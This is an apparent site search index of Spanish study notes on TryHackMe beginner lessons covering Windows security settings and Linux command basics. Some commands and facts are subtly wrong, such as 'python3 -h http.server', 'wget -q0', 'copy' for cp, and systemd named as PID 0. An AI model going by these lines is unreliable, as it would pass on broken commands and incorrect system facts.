    "content": "Windows Security es el panel para controlar las herramientas que protegen tu dispositivo y tu información. Las secciones que aparecen en este panel son:\n\n- Virus & threat protection.\n- Firewall & network protection.\n- App & browser control.\n- Device security.\n\nAntes de seguir comentaremos los colores de estado:\n\n- Verde: Significa que tu dispositivo está protegido exitosamente.\n- Amarillo: Hay una recomendación de seguridad que deberías mirar.\n- Rojo: Es un aviso de que algo necesita tu atención inmediata.\n\nPodemos hacer click en `Open Windows Security` para ver las acciones que podemos llevar a cabo con las diferentes herramientas.\n\n![[046.png]]\n\n"
  },
  {
    "title": "5. Firewall and Network Protection",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/5-firewall-and-network-protection/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/5. Firewall and Network Protection.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "<h2>¿Qué es un firewall?</h2>\n\nEl tráfico fluctúa por nuestros dispositivos a través de los puertos. El firewall es lo que controla qué sí y qué no entra.\n\nDentro de la pestaña de cortafuegos y protección de red tenemos:\n\n- Dominio: El perfil de dominio aplica a las redes donde el sistema host puede autentificarse ante un dominio controlador.\n- Privado: El perfil privado es un perfil asignado por el usuario y es usado para designar redes privadas o domésticas.\n- Público: El perfil por defecto, usado para designar redes públicas como WiFi's de aeropuertos, cafeterías, etc.\n\nAl hacer click en cualquiera de los perfiles, otra pestaña con dos opciones aparecerá:\n\n- Encender/Apagar firewall.\n-  Bloquear todas las conexiones entrantes.\n\n>[!WARNING] A menos que sepas exactamente lo que estás haciendo, es recomendable que dejes el firewall encendido.\n\n----------------\n<h2>Permitir una app en el firewall</h2>\nEn este menú puedes decidir si darle permisos de entrada a una app a través del firewall. Algunas apps ofrecen información detallada en `Details`.\n\n------------------\n<h2>Ajustes avanzados</h2>\nConfigurar tú mismo el firewall es sólo para usuarios avanzados. Para buenas prácticas pincha [aquí](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/best-practices-configuring).\n\n>[!TIP] El comando para abrir el Windows Defender Firewall es `WF.msc`.\n\n"
  },
  {
    "title": "7. Device Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/7-device-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/7. Device Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Aunque seguramente nunca cambies ninguno de estos ajustes, para hacer la guía completa, lo cubriremos.\n\nCore Isolation:\n\n- Integridad de la memoria: Previene a los ataques insertar código malicioso en procesos de alta seguridad.\n- Procesador de seguridad: Llamado TPM (Trusted Platform Module) ofrece encriptación adicional a tu dispositivo."
  },
  {
    "title": "2. Windows Updates",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/2-windows-updates/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/2. Windows Updates.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Empezaremos con la actualizaciones de Windows.\n\nEs un servicio para dar actualizaciones seguras y de seguridad a los sistemas.\n\nEstas actualizaciones suelen ser lanzadas el segundo martes de cada mes. Se le llama Patch Tuesday (Martes de Parche). De todas formas si la actualización es urgente, esto no quiere decir que tenga que esperar hasta el siguiente martes para salir.\n\nUna de las desventajas principales de las actualizaciones en Windows, es que el sistema necesita ser reiniciado inmediatamente después (al contrario que en Linux). Es por esto que durante muchos años, los usuarios posponían las actualizaciones y acababan siendo olvidadas. A partir de Windows 10, ya no puedes hacer eso."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "Esta lección intentará dar una visión general de las funcionalidades de seguridad de Windows."
  },
  {
    "title": "0. Windows Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/5-windows-fundamentals/3-windows-fundamentals-part-3/0-windows-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/0. Windows Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 5. Windows Fundamentals > 3. Windows Fundamentals Part 3",
    "content": "[[THM/0. Pre Career/1. Pre Security/5. Windows Fundamentals/3. Windows Fundamentals Part 3/1. Introduction|1. Introduction]]\n[[2. Windows Updates]]\n[[3. Windows Security]]\n[[4. Virus and Threat Protection]]\n[[5. Firewall and Network Protection]]\n[[6. App and Browser Control]]\n[[7. Device Security]]\n[[8. BitLocker]]\n[[9. Volume Shadow Copy Service]]\n"
  },
  {
    "title": "5. Searching for files",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/5-searching-for-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/5. Searching for files.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Una de las características principales de Linux es lo eficiente que puedes ser con él.\n\nPara encontrar archivos en el sistema no hace falta usar cd y ls constantemente sino que podemos usar comandos como find para automatizar la búsqueda.\n\n---------------------\n<h2>Usando Find</h2>\nSi sabemos el nombre exacto de lo que buscamos pero no nos acordamos dónde está:\n\n```bash\ntryhackme@linux1:~$ find -name passwords.txt\n./floder1/passwords.txt\n```\n\nSi no nos acordamos del nombre entero pero si de la extensión podríamos realizar una búsqueda de la siguiente manera:\n\n```bash\ntryhackme@linux1:~$ find -name *.txt\n./folder1/passwords.txt\n./Documents/todo.txt\n```\n\n----------------------\n<h2>Usando Grep</h2>\nEl comando grep nos permite buscar contenidos de un archivo específico.\n\nTomemos como ejemplo el archivo access.log que tiene 244 líneas:\n\n```bash\ntryhackme@linux1:~$ wc -l access.log\n244 access.log\n```\n\nPodemos usar grep para filtrar el contenido que nos interese, en este caso ver si la IP 81.143.211.90  se encuentra en el archivo:\n\n```bash\ntryhackme@linux1:~$ grep \"81.143.211.90\" access.log\n81.143.211.90 - - [25/Mar/2021:11:17 + 0000] \"GET / HTTP/1.1\" 200 417 \"-\" \"Mozilla/5.0 (Linux; Android 7.0; Moto G(4))\"\n```\n"
  },
  {
    "title": "6. An Introduction to Shell Operators",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/6-an-introduction-to-shell-operators/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/6. An Introduction to Shell Operators.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Los operadores en Linux son una manera fantástica de almpliar el nivel de trabajo con Linux. Hay unos cuantos operadores que debemos aprender a usar:\n\n| Symbol / Operator | Description                                                                                                                                   |\n| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |\n| &                 | Este operador te permite ejecutar comandos en segundo plano.                                                                                  |\n| &&                | Este operador te permite combinar varios comandos en uno.                                                                                     |\n| >                 | Este operador es un redirector, coge el resultado de otro comando o un archivo y redirige por la salida estándar hasta el sitio especificado. |\n| >>                | Hace lo mismo que el de arriba, pero añadiendo en vez de desplazando.                                                                         |\n\n---------------\n<h2>Operador \"&\"</h2>\nNos permite ejecutar comandos en el fondo (segundo plano). Por ejemplo imaginémonos que queremos hacer una copia de un archivo muy grande. Esto obviamente tomará un rato y nos dejará sin poder utilizar la terminal.\n\n```bash\ntryhackme@linux1:~$ copy large_file.txt large_file_copy.txt &\n```\n\n---------------\n<h2>Operador \"&&\"</h2>\nPodemos usarlo para unir dos comandos: `comando1 && comando2`. El problema es que `comando2` sólo se ejecutará si `comando1` fue exitoso.\n\n\n---------------\n<h2>Operador \">\"</h2>\nEs conocido como redirector de salida (output redirector).\n\nHemos visto que `echo howdy` nos devuelve howdy, pero esto no es muy útil. algo mejor sería meterlo en un archivo:\n\n```bash\ntryhackme@linux1:~$ echo hey > welcome\ntryhackme@linux1:~$ cat welcome\nhey\n```\n\n>[!WARNING] Si el archivo ya existe será sobreescrito (se borrarán los datos ya existentes para dejar los nuevos).\n\n---------------\n<h2>Operador \">>\"</h2>\nTambién es un redirector de salida como el previo que hemos visto. De todas formas, lo que hace a este operador diferente es el hecho de que no sobreescribe información, sino que añade al existente (si hay, si no crea uno) la nueva información.\n\n```bash\ntryhackme@linux1:~$ echo hello >> welcome\ntryhackme@linux1:~$ cat welcome\nhey\nhello\n```\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Linux es uno de los sistemas operativos más utilizados en el mundo, corriendo en coches inteligentes, dispositivos android, supercomputadoras, servidores, etc. Cubriremos algunos de los básicos de Linux.\n\n- Ejecutar tus primeros comandos en una máquina Linux.\n- Enseñarte algunos comandos esenciales usados para interactuar con el sistema de ficheros.\n- Desmostrar cómo puedes buscar archivos e introducirte en los operadores shell.\n"
  },
  {
    "title": "0. Linux Fundamentals 1",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/0-linux-fundamentals-1/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/0. Linux Fundamentals 1.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "[[THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/1. Introduction|1. Introduction]]\n[[2. A Bit of Background on Linux]]\n[[3. Running your First few Commands]]\n[[4. Interacting with the Filesystem!]]\n[[5. Searching for files]]\n[[6. An Introduction to Shell Operators]]\n"
  },
  {
    "title": "3. Running your First few Commands",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/3-running-your-first-few-commands/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/3. Running your First few Commands.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "Como hemos visto la ventaja principal es la poca cantidad de memoria que necesitan estos sistemas para funcionar. De todas formas esto implica que muchas veces no tienen GUI o \"escritorio\". Una gran parte, entonces, de la interacción con estos sistemas se hace a través de una terminal con una línea de comandos.\n\n```bash\ntryhackme@linux1:~$ introduce_comandos__aquí\n```\n\nAsí se ve una terminal.\n\nNecesitamos hacer funciones básicas como navegar entre archivos, ver sus contenidos o crear archivos. Vamos a empezar con algunos comandos básicos:\n\n| Command | Description                                                    |\n| ------- | -------------------------------------------------------------- |\n| echo    | Muestra por la salida estándar cualquier texto que le pasemos. |\n| whoami  | Nos dice qué usuario somos actualmente.                        |\nSi queremos imprimir una sola palabra no necesitamos comillas, sin embargo si queremos imprimir más, sí:\n\n```bash\ntryhackme@linux1:~$ echo Hello\nHello\ntryhackme@linux1:~$ echo \"Hello Friend!\"\nHello Friend!\n```\n\nWhoami puede ser usado así:\n\n```bash\ntryhackme@linux1:~$ whoami\ntryhackme\n```\n\n"
  },
  {
    "title": "2. A Bit of Background on Linux",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/2-a-bit-of-background-on-linux/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/2. A Bit of Background on Linux.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "<h2>¿Dónde se usa Linux?</h2>\nLinux es considerablemente más ligero que otros sistemas operativos y es posible que hayas utilizado Linux sin haberte dado cuenta. Linux se utiliza en:\n\n- Páginas web que visitas.\n- Paneles de control/entretenimiento en los coches.\n- Puntos de venta como los checkouts.\n- Infraestructuras críticas, como las luces de tráfico.\n\n------------------\n<h2>Sabores de Linux</h2>\nLinux es realmente un paraguas bajo el cual descansan varios sistemas operativos basados en UNIX. Gracias a que Linux es de código abierto, las variantes de Linux tienen todos los colores y formas y se pueden personalizar para crear el tuyo propio adecuado a tus necesidades.\n\nUbuntu y Debian son dos de las distribuciones más utilizadas. Servidores de Ubuntu pueden correr en sistemas con sólo 512MB de RAM."
  },
  {
    "title": "4. Interacting with the Filesystem!",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-1/4-interacting-with-the-filesystem/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 1/4. Interacting with the Filesystem!.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 1",
    "content": "En esta lección veremos cómo navegar en el sistema de ficheros, leer y crear archivos.\n\n<h2>Interactuar con el Sistema de Ficheros</h2>\nSer capaz de navegar entre ficheros es esencial, para ello:\n\n| Command | Full Name                                             |\n| ------- | ----------------------------------------------------- |\n| ls      | Listar los archivos de un directorio                  |\n| cd      | Cambiar de directorio.                                |\n| cat     | Concatenar los caracteres de un archivo               |\n| pwd     | Print Working Directory, muestra el directorio actual |\n\n-----------------\n<h3>Listar los Archivos</h3>\nAntes de poder hacer nada como leer el contenido de archivos, necesitamos saber qué existe.\n\nPara esto podemos usar ls. Podemos usar ls en rutas absolutas o relativas, no sólo en nuestro directiorio actual.\n\n```bash\ntryhackme@linux1:~$ ls\n'Important Files' 'My Documents' Notes Pictures\n```\n\n-------------------\n<h3>Cambiar nuestro Directorio actual</h3>\nChang Directory (cd) sirve para cambiar de directorio:\n\n```bash\ntryhackme@linux1:~$ cd Pictures\ntryhackme@linux1:~/Pictures$ ls\ndog_picture1.jpg dog_picture2.jpg dog_picture3.jpg\n```\n\n--------------------------\n<h3>Viendo el contenido de un Archivo</h3>\nCat es una abreviatura de concatenate, que implica concatenar los bits de texto en un sólo output, si no se especifica ese canal de salida, será la pantalla.\n\n```txt\ntryhackme@linux1:~/Documents$ cat todo.txt\nHere's something important for me to do later!\n```\n\n--------------------------\n<h3>Encontrando el path entero a nuestro Directorio Actual de Trabajo</h3>\nPara saber en qué directorio estamos actualmente existe un comando: pwd (Print Working Directory):\n\n```bash\ntryhackme@linux1:~/Documents$ pwd\n/home/ubuntu/Documents\n```\n"
  },
  {
    "title": "4. Processes 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/4-processes-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/4. Processes 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Los procesos son programas que están corriendo en nuestra máquina. Son controlados por el kernel y cada proceso tiene un ID asociado llamado PID (Process ID). Estos son incrementales (el proceso nº 60 tendrá un PID 60).\n\n<h2>Viendo Procesos</h2>\nPodemos usar el comando `ps` para ver una lista de los procesos corriendo con información adicional como el código de estado, la sesión que lo corre y el nombre del programa que lo corre.\n\n![[025.png]]\n\n>[!NOTE] Date cuenta de que en la foto de arriba un proceso tiene el PID 204 y el siguiente 205.\n\nPara ver aquellos procesos que corren otros usuarios o aquellos que no corren desde una sesión, sino desde el sistema, por ejemplo, podemos usar `ps aux`.\n\n![[026.png]]\n\nOtro comando muy útil es `top`. Este te da información en tiempo real (actualizada cada 10 segundos o cuando nos movemos con las flechas direccionales).\n\n![[027.png]]\n\n-----------------\n<h2>Controlando Procesos</h2>\nPodemos mandar señales que terminen procesos. Hay una gran variedad para ello y varían en la \"limpieza\" con la que lo hacen. Para matar un proceso utilizamos `kill <PID>`. Algunas de las señales que podemos mandar al matar los procesos son:\n\n- SIGTERM: Matamos el proceso pero le permitimos hacer limpieza antes de ello.\n- SIGKILL: Matamos el proceso abruptamente.\n- SIGSTOP: Paramos o suspendemos el proceso.\n\n----------------\n<h2>¿Cómo empiezan los procesos?</h2>\nComenzaremos hablando de los \"namespaces\". El sistema operativo los usa para dividir los recursos disponible (como CPU, RAM o prioridad).\n\nEstos son geniales para la seguridad pues es una manera de aislar procesos unos de otros. Sólo aquellos que estén en el mismo namespace serán capaces de verse unos a otros.\n\nPreviamente hemos hablado de cómo funcionan los PID. El proceso con PID 0 es el proceso que arranca el sistema. Este proceso es el *systemd*.\n\nCualquier programa o proceso que lancemos será lo que conocemos como un \"child\" (hijo) del proceso **systemd**. Esto quiere decir que está controlado por systemd y que compartirá los mismos recursos.\n\n![[028.png]]\n\n--------------------\n<h2>Haciendo que los procesos empiecen en el arranque</h2>\nAlgunas aplicaciones puedes ser arrancadas en el inicio del sistema. Por ejemplo, servidores web, bases de datos o servidores de transferencia.\n\nEn el siguiente ejemplo arrancaremos Apache2 de manera manual y luego le estaremos diciendo a Apache2 que arranque al inicio.\n\nEl comando `systemctl` nos permite interactuar con el proceso/daemon systemd. Este comando sigue el siguiente formato: `systemctl <opción> <servicio>`.\n\nPara arrancar apache, usaríamos `systemctl start apache2`. Si quisiéramos pararlo sustituiríamos start por stop.\n\nPodemos usar `systemctl` para:\n\n- start\n- stop\n- enable (hace que empiece en el arranque)\n- disable (hace que deje de empezar en el arranque)\n\n--------------------\n<h2>Introducción al Primer y Segundo Plano</h2>\nLos procesos pueden correr en dos estados: en primer plano (foreground) o en segundo plano (background). Al hacer `echo \"Hi THM\"` esperamos ver el output inmediatamente pero al añadir `&` se nos da el PID en su lugar.\n\n![[029.png]]\n\nEsto es útil para comandos como copiar grandes cantidades de archivos, porque mientras se ejecuta en segundo plano podemos seguir haciendo cosas. También podemos usar `Ctrl+Z` para llevar a un proceso al segundo plano.\n\n----------------\n<h2>Llevando un proceso al primer plano</h2>\nAhora que hemos visto cómo llevar un proceso al segundo plano, es importante saber cómo traerlo de vuelta. Para ello podemos utilizar `fg` (foreground)."
  },
  {
    "title": "0. Linux Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/0-linux-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/0. Linux Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "[[THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/1. Introduction|1. Introduction]]\n[[2. Terminal Text Editors]]\n[[3. General-Useful Utilities]]\n[[4. Processes 101]]\n[[5. Maintaining your System - Automation]]\n[[6. Maintaining your System - Package Management]]\n[[7. Maintaining your System - Logs]]\n"
  },
  {
    "title": "5. Maintaining your System - Automation",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/5-maintaining-your-system-automation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/5. Maintaining your System - Automation.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Los usuarios pueden querer programar una cierta acción o tarea para que tome lugar una vez que el sistema se haya arrancado por ejemplo comandos que hacen backups (copias de seguridad).\n\nVamos a estar hablando de los procesos `cron`. Pero más específicamente, de cómo podemos interactuar con ellos vía el uso de `crontabs`. Crontabs es uno de los procesos que se ejecuta en el arranque.\n\nLos `crontabs` requieren de exactamente 6 valores específicos:\n\n| Valor | Descripción                     |\n| ----- | ------------------------------- |\n| MIN   | En qué minuto ejecutarlo        |\n| HOUR  | En qué hora ejecutarlo          |\n| DOM   | Qué día del mes ejecutarlo      |\n| MON   | Qué mes del año ejecutarlo      |\n| DOW   | Qué día de la semana ejecutarlo |\n| CMD   | El comando a ejecutar           |\nSe vería tal que:\n\n```c\n0 */12 * * * cp -R /home/cmnatic/Documents /var/backups/\n```\n\nEsto indica que se debe copiar el contenido en la ruta establecida cada 12 horas.\n\nComo puede ser confuso existen recursos como [Crontab Generator](https://crontab-generator.org/) o [Cron Guru](https://crontab.guru/) que nos ayudan cuando no nos sale.\n\nPara editar el crontab podemos usar `crontab -e`."
  },
  {
    "title": "2. Terminal Text Editors",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/2-terminal-text-editors/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/2. Terminal Text Editors.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Durante las lecciones que hemos visto, sólo hemos llenado archivos de texto con una combinación entre `echo`, `>` y `>>`. Esta no es una manera eficiente de manejar textos. Para ello, existen editores de terminal.\n\n<h2>NANO</h2>\nEs fácil de empezar con nano. Para crear un archivo vale con hacer `nano <nombre_archivo>`. Puedes navegar por el texto con las flechas direccionales.\n\nNano tiene unas cuantas funcionalidades fáciles de recordar y  que cubren la mayoría de acciones que querrías hacer:\n\n- Buscar por texto.\n- Copiar y Pegar.\n- Ir a una línea por número.\n- Averiguar qué número tiene la línea actual.\n\n>[!NOTE] La letra `Ctrl` está representada por `^`.\n\n-------------------\n<h2>VIM</h2>\nVIM es un editor de textxo mucho más avanzado. La curva de aprendizaje es bastante pronunciada y con tiempo se pueden hacer muchas cosas.\n\n- Customizable: Puedes modificar los atajos de teclado como quieras.\n- Resalto de sintaxis: Es útil sobre todo si estamos escribiendo código.\n- Uso: VIM funciona en todas las terminales.\n- Recursos: Hay más recursos como tablas, tutoriales i."
  },
  {
    "title": "7. Maintaining your System - Logs",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/7-maintaining-your-system-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/7. Maintaining your System - Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Hemos tocado brevemente los archivos de log y dónde los podemos encontrar en [[5. Searching for files]].\n\nA continuación se ven algunos logs de los siguientes procesos:\n\n- Un servidor web apache2.\n- Logs para el servicio fail2ban, el cuales usado para monitorizarataques de fuerza bruta.\n- El servicio UFW (firewall).\n\n![[032.png]]\n\nEstos logs son una excelente manera de monitorizar la salud de tu sistema y procesos. Los dos tipos de logs que vemos debajo son:\n\n- Access logs.\n- Error logs.\n\n![[033.png]]\n\nHay, también otros logs que guardan otro tipo de información, como intentos de autentificación."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "En este tema veremos algunas utilidades y aplicaciones útiles. Aprenderemos sobre automatización, manejo de paquetes y loguearse en servicios/aplicaciones."
  },
  {
    "title": "3. General-Useful Utilities",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/3-general-useful-utilities/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/3. General-Useful Utilities.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "<h2>Descargar archivos (wget)</h2>\nUna funcionalidad bastante útil de la computación es la capacidad de transferir archivos. Para descargar programas, scripts o incluso imágenes, vamos a cubrir la herramienta `wget`. \n\nEste comando nos permite descargar archivos web vía HTTP. Simplemente tenemos que proporcionar la URL del recurso. Por ejemplo si quisiera descargar un archivo `web_file.txt`, suponiendo que se la dirección URL: `wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/web_file.txt`.\n\n---------------------\n<h2>Transferir archivos desde tu Host - SCP (SSH)</h2>\nSecure CoPy (SCP) es una manera de copiar archivos de manera segura. Al contrario que el comando `cp`, este te permite mandar archivos entre dos ordenadores usando SSH. Te permite:\n\n- Copiar archivos y directorios desde tu ordenador a uno remoto.\n- Copiar archivos y directorios desde un ordenador remoto a tu ordenador.\n\nTomando como premisa que conocemos nombre de usuario y contraseña para un usuario del sistema remoto y un usuario del sistema local, para hacerlo necesitamos la siguiente información:\n\n1. La dirección IP de la máquina remota.\n2. Un usuario en la máquina remota.\n3. Nombre del archivo en la máquina local.\n4. Nombre que le pondremos al archivo en la máquina remota.\n\n`scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`\n\nPara la manera inversa (transferir un archivo desde un equipo remoto a un equipo local):\n\n`scp ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`\n\n-------------------\n<h2>Servir archivos desde tu Host - WEB</h2>\nLas máquinas Linux vienen preparadas con python3. Este proporciona un módulo fácil de usar llamado `\"HTTPServer\"`. Lo que hace es convertir tu ordenador en un servidor web de manera rápida y sencilla para hostear tus archivos, que pueden ser entonces descargados con `curl` o `wget`.\n\n`HTTPServer` correrá el servidor en el directorio en el que ejecutaste el comando. El comando que debes utilizar para ello es: `python3 -h http.server <puerto>`."
  },
  {
    "title": "6. Maintaining your System - Package Management",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/6-maintaining-your-system-package-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/6. Maintaining your System - Package Management.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "<h2>Introduciendo Paquetes y Repositorios de Software</h2>\nCuando los desarrolladores de software quieren subir su trabajo a la comunidad pueden subirlo a un repositorio \"apt\". Si es aprobado, sus programas y herramientas serán compartidos.\n\n![[031.png]]\n\nLos archivos listados en `/etc/apt/` sirven como gateway/registro. Puedes añadir repositorios de la comunidad a tu sistema operativo haciendo `add-apt-repositorio`.\n\n------------------\n<h2>Controlando tus repositorios (añadiendo y eliminando)</h2>\nNormalmente usamos apt para instalar software en nuestro sistema. Apt es un comando de un gestor de paquetes y contiene una gran cantidad de herramientas.\n\nEs seguro descargar este software por las claves GPG (GNU Privacy Guard). Estas son usadas por los desarrolladores y si a la hora de descargar estos paquetes las claves no coinciden no se descargará.\n\n1. Empezaremos descargando la clave GPG de los desarrolladores de Sublime Text 3: `wget -q0 - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -`.\n2. Ahora que hemos añadido la llave a nuestra lista de claves confiables, podemos añadir el repositorio de Sublime Text 3 a nuestra lista de fuente apt.\n\t1. Crearemos un archivo llamado **sublime-text.list** en **/etc/apt/sources.list.d** e introduciremos la información así.\n\t   \n```bash\nvim sublime-text.list\n\ndentro del archivo escribimos:\n\ndeb https://download.sublimetext.com/ apt/stable/\n```\n\n3. Después de añadir esta línea necesitamos actualizar apt: `apt update`.\n4. Ahora ya podemos instalar el software: `apt install sublime-text`.\n5. Para borrar: `add-apt-repository --remove ppa:PPA_Name/ppa` o borrar manualmente el archivo que hemos creado antes.\n6. Una vez borrado podemos usar `apt remove <nombre_software>`, por ejemplo, `apt remove sublime-text`."
  },
  {
    "title": "2. Accessing Your Linux Machine Using SSH",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/2-accessing-your-linux-machine-using-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/2. Accessing Your Linux Machine Using SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
